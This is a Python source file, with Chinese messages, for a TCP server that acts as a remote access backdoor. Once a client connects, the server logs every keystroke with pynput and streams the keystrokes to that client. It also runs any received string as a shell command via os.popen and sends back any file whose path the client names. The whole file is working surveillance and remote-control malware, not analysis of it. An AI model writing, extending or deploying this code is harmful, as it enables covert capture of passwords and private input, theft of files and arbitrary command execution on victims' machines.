import socket
import sys
import os
from pynput import keyboard
from threading import Thread
from queue import Queue

class Server:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.bufferSize = 10240
        self.keylog_queue = Queue()
        self.is_monitoring = False
        
    def on_press(self, key):
        try:
            if hasattr(key, 'char'):
                key_char = key.char
                print(f"捕获普通按键: {key_char}")
            else:
                key_char = str(key)
                print(f"捕获特殊按键: {key_char}")
            
            self.keylog_queue.put(f"Key pressed: {key_char}")
        except Exception as e:
            print(f"处理按键事件出错: {str(e)}")

    def start_keylogger(self):
        try:
            self.is_monitoring = True
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            print("键盘监控已成功启动")
        except Exception as e:
            print(f"启动键盘监控失败: {str(e)}")
            self.is_monitoring = False

    def stop_keylogger(self):
        if self.is_monitoring:
            self.listener.stop()
            self.is_monitoring = False
            print("键盘监控已停止")

    def send_keylog(self, conn):
        print("开始发送键盘记录...")  # 调试信息
        while self.is_monitoring:
            try:
                if not self.keylog_queue.empty():
                    keylog = self.keylog_queue.get()
                    print(f"准备发送: {keylog}")  # 调试信息
                    conn.send(('0001' + keylog).encode('utf-8'))
                    print("发送成功")  # 调试信息
            except Exception as e:
                print(f"发送键盘记录失败: {str(e)}")
                break
        print("键盘记录发送线程结束")  # 调试信息

    def start(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.bind((self.ip, self.port))
            s.listen(10)
            print("等待客户端连接...")
            while True:
                try:
                    conn, addr = s.accept()
                    print(f"客户端连接 {addr[0]}:{str(addr[1])}")
                    
                    self.start_keylogger()
                    
                    keylog_thread = Thread(target=self.send_keylog, args=(conn,))
                    keylog_thread.daemon = True
                    keylog_thread.start()
                    
                    while True:
                        data = conn.recv(self.bufferSize)
                        if not data:
                            break
                        else:
                            self.executeCommand(conn, data)
                            
                    self.stop_keylogger()
                    conn.close()
                except socket.error as msg:
                    print("Error connecting to server:", msg)
                    self.stop_keylogger()
                    conn.close()
        finally:
            s.close()

    def executeCommand(self, tcpCliSock, data):
        try:
            message = data.decode("utf-8")
            print(message)
            
            if message == "START_KEYLOG":
                if not self.is_monitoring:
                    self.start_keylogger()
                    tcpCliSock.send("键盘监控已启动".encode('utf-8'))
                return
            elif message == "STOP_KEYLOG":
                if self.is_monitoring:
                    self.stop_keylogger()
                    tcpCliSock.send("键盘监控已停止".encode('utf-8'))
                return
                
            if os.path.isfile(message):
                fileSize = os.path.getsize(message)
                print("文件大小:", fileSize)
                tcpCliSock.send(str(fileSize).encode())
                data = tcpCliSock.recv(self.bufferSize)
                print('开始发送文件')
                f = open(message, "rb")
                for line in f:
                    tcpCliSock.send(line)
            else:
                tcpCliSock.send(('0001' + os.popen(message).read()).encode('utf-8'))
        except:
            raise
        
    

if __name__ == "__main__":
    server = Server("", 8800)
    server.start()

